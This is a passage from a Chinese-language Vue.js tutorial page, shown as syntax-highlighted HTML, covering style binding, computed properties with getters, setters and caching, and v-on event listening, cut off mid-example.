html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--&lt;h2 :style=&quot;&#123;key(属性名): value(属性值)&#125;&quot;&gt;&#123;&#123;message&#125;&#125;&lt;/h2&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--&#x27;50px&#x27;必须加上单引号, 否则是当做一个变量去解析--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--&lt;h2 :style=&quot;&#123;fontSize: &#x27;50px&#x27;&#125;&quot;&gt;&#123;&#123;message&#125;&#125;&lt;/h2&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--finalSize当成一个变量使用--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--&lt;h2 :style=&quot;&#123;fontSize: finalSize&#125;&quot;&gt;&#123;&#123;message&#125;&#125;&lt;/h2&gt;--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">:style</span>=<span class="string">&quot;&#123;fontSize: finalSize + &#x27;px&#x27;, backgroundColor: finalColor&#125;&quot;</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">:style</span>=<span class="string">&quot;getStyles()&quot;</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>: <span class="string">&#x27;你好啊&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">finalSize</span>: <span class="number">100</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">finalColor</span>: <span class="string">&#x27;red&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">getStyles</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> &#123;<span class="attr">fontSize</span>: <span class="variable language_">this</span>.<span class="property">finalSize</span> + <span class="string">&#x27;px&#x27;</span>, <span class="attr">backgroundColor</span>: <span class="variable language_">this</span>.<span class="property">finalColor</span>&#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><p>绑定方式二：数组语法</p><p><code>&lt;div v-bind:style=&quot;[baseStyles, overridingStyles]&quot;&gt;&lt;/div&gt;</code></p><p>style后面跟的是一个数组类型，多个值以逗号分割即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;app&quot;</span>&gt;</span><br><span class="line">    &lt;h2 :style=<span class="string">&quot;[baseStyle, baseStyle1]&quot;</span>&gt;&#123;&#123;message&#125;&#125;&lt;/h2&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=<span class="string">&quot;../js/vue.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="type">const</span> <span class="variable">app</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">        el: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">        data: &#123;</span><br><span class="line">            message: <span class="string">&#x27;你好啊&#x27;</span>,</span><br><span class="line">            baseStyle: &#123;backgroundColor: <span class="string">&#x27;red&#x27;</span>&#125;,</span><br><span class="line">            baseStyle1: &#123;fontSize: <span class="string">&#x27;100px&#x27;</span>&#125;,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="计算属性"><a href="#计算属性" class="headerlink" title="计算属性"></a>计算属性</h1><h2 id="computed选项"><a href="#computed选项" class="headerlink" title="computed选项"></a>computed选项</h2><p>在模板中可以直接通过插值语法显示一些data中的数据。</p><p>但是在某些情况，我们可能需要对数据进行一些转化后再显示，或者需要将多个数据结合起来进行显示。</p><p>比如我们有firstName和lastName两个变量，需要显示完整的名称。</p><p>但是如果多个地方都需要显示完整的名称，我们就需要写多个<code>&#123;&#123;firstName&#125;&#125; &#123;&#123;lastName&#125;&#125;</code></p><p>我们可以将上面的代码换成计算属性，计算属性是写在实例的computed选项中的</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;firstName + &#x27; &#x27; + lastName&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;firstName&#125;&#125; &#123;&#123;lastName&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;getFullName()&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">firstName</span>: <span class="string">&#x27;Lebron&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">lastName</span>: <span class="string">&#x27;James&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// computed: 计算属性()</span></span></span><br><span class="line"><span class="language-javascript">        <span class="attr">computed</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">fullName</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">firstName</span> + <span class="string">&#x27; &#x27;</span> + <span class="variable language_">this</span>.<span class="property">lastName</span></span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">getFullName</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">firstName</span> + <span class="string">&#x27; &#x27;</span> + <span class="variable language_">this</span>.<span class="property">lastName</span></span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="计算属性的复杂操作"><a href="#计算属性的复杂操作" class="headerlink" title="计算属性的复杂操作"></a>计算属性的复杂操作</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>总价格: &#123;&#123;totalPrice&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">books</span>: [</span></span><br><span class="line"><span class="language-javascript">                &#123;<span class="attr">id</span>: <span class="number">110</span>, <span class="attr">name</span>: <span class="string">&#x27;Unix编程艺术&#x27;</span>, <span class="attr">price</span>: <span class="number">119</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">                &#123;<span class="attr">id</span>: <span class="number">111</span>, <span class="attr">name</span>: <span class="string">&#x27;代码大全&#x27;</span>, <span class="attr">price</span>: <span class="number">105</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">                &#123;<span class="attr">id</span>: <span class="number">112</span>, <span class="attr">name</span>: <span class="string">&#x27;深入理解计算机原理&#x27;</span>, <span class="attr">price</span>: <span class="number">98</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">                &#123;<span class="attr">id</span>: <span class="number">113</span>, <span class="attr">name</span>: <span class="string">&#x27;现代操作系统&#x27;</span>, <span class="attr">price</span>: <span class="number">87</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">            ]</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">computed</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">totalPrice</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">let</span> result = <span class="number">0</span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">for</span> (<span class="keyword">let</span> i=<span class="number">0</span>; i &lt; <span class="variable language_">this</span>.<span class="property">books</span>.<span class="property">length</span>; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">                    result += <span class="variable language_">this</span>.<span class="property">books</span>[i].<span class="property">price</span></span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> result</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// for (let i in this.books) &#123;</span></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">//   this.books[i]</span></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">//</span></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// for (let book of this.books) &#123;</span></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">//</span></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="计算属性的setter和getter"><a href="#计算属性的setter和getter" class="headerlink" title="计算属性的setter和getter"></a>计算属性的setter和getter</h2><p><strong>每个计算属性都包含一个getter和一个setter。</strong></p><p>在上面的例子中，我们只是使用getter来读取。</p><p>在某些情况下，你也可以提供一个setter方法（不常用）。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">firstName</span>: <span class="string">&#x27;Kobe&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">lastName</span>: <span class="string">&#x27;Bryant&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">computed</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// fullName是一个对象，所以调用时后面不用加括号</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 计算属性一般是没有set方法, 只读属性.</span></span></span><br><span class="line"><span class="language-javascript">            <span class="attr">fullName</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">set</span>: <span class="keyword">function</span>(<span class="params">newValue</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">const</span> names = newValue.<span class="title function_">split</span>(<span class="string">&#x27; &#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">this</span>.<span class="property">firstName</span> = names[<span class="number">0</span>];</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">this</span>.<span class="property">lastName</span> = names[<span class="number">1</span>];</span></span><br><span class="line"><span class="language-javascript">                &#125;,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">get</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">firstName</span> + <span class="string">&#x27; &#x27;</span> + <span class="variable language_">this</span>.<span class="property">lastName</span></span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 简写方式：</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// fullName: function () &#123;</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//   return this.firstName + &#x27; &#x27; + this.lastName</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="计算属性的缓存"><a href="#计算属性的缓存" class="headerlink" title="计算属性的缓存"></a>计算属性的缓存</h2><p>methods和computed看起来都可以实现我们的功能，</p><p>那么为什么还要多一个计算属性这个东西呢？</p><p>原因：<strong>计算属性会进行缓存，如果多次使用时，计算属性只会调用一次。</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--1.直接拼接: 语法过于繁琐--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;firstName&#125;&#125; &#123;&#123;lastName&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--2.通过定义methods--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--&lt;h2&gt;&#123;&#123;getFullName()&#125;&#125;&lt;/h2&gt;--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--&lt;h2&gt;&#123;&#123;getFullName()&#125;&#125;&lt;/h2&gt;--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--&lt;h2&gt;&#123;&#123;getFullName()&#125;&#125;&lt;/h2&gt;--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--&lt;h2&gt;&#123;&#123;getFullName()&#125;&#125;&lt;/h2&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--3.通过computed--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">firstName</span>: <span class="string">&#x27;Kobe&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">lastName</span>: <span class="string">&#x27;Bryant&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">getFullName</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;getFullName&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">firstName</span> + <span class="string">&#x27; &#x27;</span> + <span class="variable language_">this</span>.<span class="property">lastName</span></span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">computed</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">fullName</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;fullName&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">firstName</span> + <span class="string">&#x27; &#x27;</span> + <span class="variable language_">this</span>.<span class="property">lastName</span></span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当使用<code>&#123;&#123;getFullName()&#125;&#125;</code>时可以看到控制台打印了四次，而使用<code>&#123;&#123;fullName&#125;&#125;</code>时控制台只打印了一次。</p><h1 id="事件监听"><a href="#事件监听" class="headerlink" title="事件监听"></a>事件监听</h1><h2 id="v-on"><a href="#v-on" class="headerlink" title="v-on"></a>v-on</h2><p>在前端开发中，我们需要经常和用于交互。这个时候，我们就必须监听用户发生的时间，比如点击、拖拽、键盘事件等等。在Vue中如何监听事件呢？使用v-on指令。</p><p>v-on也有对应的语法糖：v-on:click可以写成@click</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;counter&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--&lt;button v-on:click=&quot;counter++&quot;&gt;+&lt;/button&gt;--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--&lt;button v-on:click=&quot;counter--;&quot;&gt;-&lt;/button&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--&lt;button v-on:click=&quot;increment&quot;&gt;+&lt;/button&gt;--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--&lt;button v-on:click=&quot;decrement&quot;&gt;-&lt;/button&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;increment&quot;</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;decrement&quot;</span>&gt;</span>-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">counter</span>: <span class="number">0</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">increment</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">this</span>.<span class="property">counter</span>++</span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">decrement</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">this</span>.<span class="property">counter</span>--</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-on参数问题"><a href="#v-on参数问题" class="headerlink" title="v-on参数问题"></a>v-on参数问题</h2><p>当通过methods中定义方法，以供@click调用时，需要注意参数问题：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 